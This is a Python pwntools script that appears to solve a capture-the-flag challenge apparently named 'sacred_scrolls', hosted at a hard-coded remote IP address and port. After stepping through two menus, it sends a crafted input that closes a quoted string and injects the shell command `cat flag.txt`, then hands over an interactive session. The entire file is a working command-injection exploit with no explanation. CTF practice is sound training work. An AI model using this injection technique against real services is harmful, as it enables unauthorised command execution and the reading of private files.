from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./sacred_scrolls')
p = remote("206.189.116.117", 32315)

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
# gdb.attach(p)

p.recvuntil("tag: ")
p.sendline("1")
p.recvuntil(">> ")
p.sendline("1")
sla(": ", "aGly';cat flag.txt;echo 'aGly")

p.interactive()
